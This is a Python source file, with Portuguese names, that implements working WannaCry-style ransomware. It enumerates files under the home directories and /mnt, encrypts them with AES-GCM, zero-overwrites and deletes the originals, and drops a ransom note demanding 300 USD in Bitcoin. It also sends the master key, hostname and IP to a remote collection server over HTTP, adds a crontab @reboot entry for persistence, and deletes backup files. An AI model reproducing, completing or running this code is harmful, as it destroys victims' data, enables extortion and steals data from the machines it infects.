import os
import sys
import json
import base64
import secrets
import stat
import socket
import uuid
import requests
import subprocess
import shlex
from pathlib import Path
from typing import List, Iterable, Union
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def enumerar_arquivos(
    extensoes_permitidas: Iterable[str],
    diretorios_base: List[Path] = None,
) -> List[Path]:
    if diretorios_base is None:
        home = Path.home()
        diretorios_base = [
            home / "Home",
            home / "home",
            home / "Documents",
            home / "Documentos",
            home / "Desktop",
            home / "Área de Trabalho",
            home / "Images",
            home / "Imagens",
            Path("/mnt"),
        ]
    ext_set = {
        (e if e.startswith(".") else f".{e}").lower()
        for e in extensoes_permitidas
    }
    arquivos_encontrados: List[Path] = []
    for diretorio in diretorios_base:
        try:
            if not diretorio.is_dir():
                continue
            for raiz, _, arquivos in os.walk(diretorio, followlinks=False):
                for nome in arquivos:
                    caminho = Path(raiz) / nome
                    if caminho.suffix.lower() in ext_set:
                        arquivos_encontrados.append(caminho.resolve())
        except PermissionError:
            print(f"Permissão negada ao acessar: {diretorio}")
        except Exception as exc:
            print(f"Erro ao processar {diretorio}: {exc}")
    return arquivos_encontrados

def _iterate_paths(
    target: Union[str, Path, Iterable[Union[str, Path]]]
) -> List[Path]:
    if isinstance(target, (str, Path)):
        p = Path(target)
        if p.is_dir():
            return [f for f in p.rglob("*") if f.is_file()]
        elif p.is_file():
            return [p]
        else:
            raise FileNotFoundError(f"Path not found: {p}")
    else:
        files = []
        for item in target:
            files.extend(_iterate_paths(item))
        return files

def criptografar_e_apagar(
    caminhos: Union[str, Path, Iterable[Union[str, Path]]],
    chave_aes256: bytes,
    *,
    chunk_size: int = 64 * 1024,
) -> List[Path]:
    if len(chave_aes256) != 32:
        raise ValueError("A chave AES‑256 deve ter exatamente 32 bytes.")
    arquivos = _iterate_paths(caminhos)
    arquivos_crypt = []
    for src_path in arquivos:
        src_path = src_path.resolve()
        dst_path = src_path.with_name(src_path.name + ".wncry")
        nonce = secrets.token_bytes(12)
        aesgcm = AESGCM(chave_aes256)
        tmp_dst = dst_path.with_suffix(dst_path.suffix + ".tmp")
        with open(src_path, "rb") as f_in, open(tmp_dst, "wb") as f_out:
            f_out.write(nonce)
            while True:
                chunk = f_in.read(chunk_size)
                if not chunk:
                    break
                ciphertext = aesgcm.encrypt(nonce, chunk, None)
                f_out.write(ciphertext)
        tmp_dst.replace(dst_path)
        arquivos_crypt.append(dst_path)
        size = src_path.stat().st_size
        with open(src_path, "r+b") as f:
            f.seek(0)
            f.write(b"\x00" * min(chunk_size, size))
            remaining = size - min(chunk_size, size)
            while remaining > 0:
                write_len = min(chunk_size, remaining)
                f.write(b"\x00" * write_len)
                remaining -= write_len
            f.flush()
            os.fsync(f.fileno())
        src_path.unlink()
    return arquivos_crypt

def persistir_master_key(
    path: str = "/tmp/.master.key",
    key_length: int = 32,
    nonce_length: int = 12,
) -> dict:
    master_key_bytes = secrets.token_bytes(key_length)
    nonce_bytes = secrets.token_bytes(nonce_length)
    master_key_b64 = base64.b64encode(master_key_bytes).decode("utf-8")
    nonce_b64 = base64.b64encode(nonce_bytes).decode("utf-8")
    data = {"master_key": master_key_b64, "nonce": nonce_b64}
    json_data = json.dumps(data)
    file_path = Path(path)
    file_path.parent.mkdir(parents=True, exist_ok=True)
    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
    mode = 0o600
    fd = os.open(file_path, flags, mode)
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write(json_data)
    os.chmod(file_path, mode)
    return data

def carregar_master_key(path: str = "/tmp/.master.key") -> dict:
    file_path = Path(path)
    with file_path.open("r", encoding="utf-8") as f:
        data = json.load(f)
    if not {"master_key", "nonce"} <= data.keys():
        raise ValueError("Formato inválido do arquivo de chave mestra.")
    return data

def gerar_relatorio_ransom(diretorio_raiz: str) -> None:
    mensagem = (
        "Seu(s) arquivo(s) foram criptografados.\n"
        "Para restaurá-los, efetue o pagamento de 300 USD em Bitcoin:\n"
        "Endereço BTC: 1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q\n"
        "Após o pagamento, entre em contato via Tor:\n"
        "http://exampleonionaddress.onion\n"
    )
    nome_arquivo = "#_LEIA_ME_WNCRY_#.txt"
    for caminho_atual, subdirs, _ in os.walk(diretorio_raiz):
        caminho_arquivo = os.path.join(caminho_atual, nome_arquivo)
        try:
            with open(caminho_arquivo, "w", encoding="utf-8") as f:
                f.write(mensagem)
        except OSError as e:
            print(f"Erro ao criar '{caminho_arquivo}': {e}")

def exfiltrar_chave() -> dict:
    chave_path = Path("/tmp/.master.key")
    if not chave_path.is_file():
        return {"status": "error", "detail": "Arquivo de chave não encontrado"}
    try:
        chave_conteudo = chave_path.read_text().strip()
        hostname = socket.gethostname()
        ip = None
        for iface_info in socket.getaddrinfo(hostname, None):
            family, _, _, _, sockaddr = iface_info
            if family == socket.AF_INET:
                candidate = sockaddr[0]
                if not candidate.startswith("127."):
                    ip = candidate
                    break
        if ip is None:
            ip = "127.0.0.1"
        nonce = str(uuid.uuid4())
        payload = {
            "chave": chave_conteudo,
            "nonce": nonce,
            "hostname": hostname,
            "ip": ip
        }
        url = "http://10.254.19.238:8080/collect"
        response = requests.post(url, json=payload, timeout=10)
        if 200 <= response.status_code < 300:
            try:
                chave_path.unlink()
            except Exception as e:
                return {"status": "error", "detail": f"Enviado, mas falha ao remover arquivo: {e}"}
            return {"status": "success", "detail": "Chave exfiltrada e arquivo removido"}
        else:
            return {"status": "error", "detail": f"HTTP {response.status_code}: {response.text}"}
    except Exception as exc:
        return {"status": "error", "detail": f"Exceção: {exc}"}

def _read_crontab() -> str:
    try:
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, check=False)
        return result.stdout if result.returncode == 0 else ''
    except Exception as e:
        raise RuntimeError(f'Erro ao ler crontab: {e}') from e

def _write_crontab(crontab_content: str) -> None:
    try:
        proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
        proc.communicate(crontab_content)
        if proc.returncode != 0:
            raise RuntimeError(f'Código de retorno {proc.returncode} ao escrever crontab')
    except Exception as e:
        raise RuntimeError(f'Erro ao escrever crontab: {e}') from e

def _ensure_reboot_entry(script_path: str) -> None:
    script_path = os.path.abspath(script_path)
    entry = f'@reboot {shlex.quote(script_path)}'
    crontab = _read_crontab().splitlines()
    filtered = [line for line in crontab if not line.strip().endswith(shlex.quote(script_path))]
    if entry not in filtered:
        filtered.append(entry)
    new_crontab = '\n'.join(filtered) + '\n'
    _write_crontab(new_crontab)

def _remove_backup_files(pastas_alvo):
    exts = ('.bak', '.backup', '.old')
    for pasta in pastas_alvo:
        path = Path(pasta).expanduser().resolve()
        if not path.is_dir():
            raise NotADirectoryError(f'Pasta alvo inexistente ou não é diretório: {path}')
        for root, _, files in os.walk(path):
            for fname in files:
                if fname.lower().endswith(exts):
                    full_path = Path(root) / fname
                    try:
                        full_path.unlink()
                    except PermissionError as e:
                        raise PermissionError(f'Permissão negada ao remover {full_path}') from e
                    except OSError as e:
                        raise OSError(f'Erro ao remover {full_path}: {e}') from e

def configurar_persistencia(script_path: str, pastas_alvo):
    if not isinstance(script_path, str) or not script_path:
        raise ValueError('script_path deve ser uma string não vazia')
    if not isinstance(pastas_alvo, (list, tuple)):
        raise ValueError('pastas_alvo deve ser uma lista ou tupla de strings')
    try:
        _ensure_reboot_entry(script_path)
        _remove_backup_files(pastas_alvo)
        return True
    except Exception as exc:
        raise RuntimeError(f'Falha ao configurar persistência: {exc}') from exc

if __name__ == "__main__":
    # 1. Gerar e persistir master key
    master_data = persistir_master_key()
    chave_bytes = base64.b64decode(master_data["master_key"])
    # 2. Enumerar arquivos de interesse
    extensoes = [".txt", ".pdf", ".jpg", ".png", ".docx", ".xlsx"]
    arquivos_alvo = enumerar_arquivos(extensoes)
    # 3. Criptografar e apagar os arquivos encontrados
    criptografados = criptografar_e_apagar(arquivos_alvo, chave_bytes)
    # 4. Gerar relatório de resgate nas pastas onde arquivos foram criptografados
    for p in criptografados:
        gerar_relatorio_ransom(str(p.parent))
    # 5. Exfiltrar chave mestra
    resultado_exfiltracao = exfiltrar_chave()
    print(json.dumps(resultado_exfiltracao, ensure_ascii=False))
    # 6. Configurar persistência do script
    script_path = os.path.abspath(__file__)
    pastas_para_limpar = [str(Path.home() / "test_folder")]
    try:
        os.makedirs(pastas_para_limpar[0], exist_ok=True)
        configurar_persistencia(script_path, pastas_para_limpar)
        print("Persistência configurada.")
    except Exception as e:
        print(f"Erro ao configurar persistência: {e}")